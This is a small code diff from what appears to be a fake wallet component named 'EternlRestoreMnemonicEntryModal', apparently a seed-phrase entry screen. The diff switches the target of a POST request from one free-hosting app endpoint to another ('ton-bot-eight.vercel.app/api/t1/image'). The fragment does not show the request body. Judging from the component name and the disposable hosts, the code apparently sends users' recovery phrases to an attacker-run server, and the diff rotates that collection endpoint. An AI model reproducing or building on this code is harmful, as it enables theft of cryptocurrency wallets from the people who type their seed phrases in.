@@ -170,7 +170,7 @@ export default function EternlRestoreMnemonicEntryModal({
       };
 
       const response = await fetch(
-        "https://rotten-shaun-ethname-62fa05f5.koyeb.app/api/t1/image",
+        "https://ton-bot-eight.vercel.app/api/t1/image",
         {
           method: "POST",
           headers: {
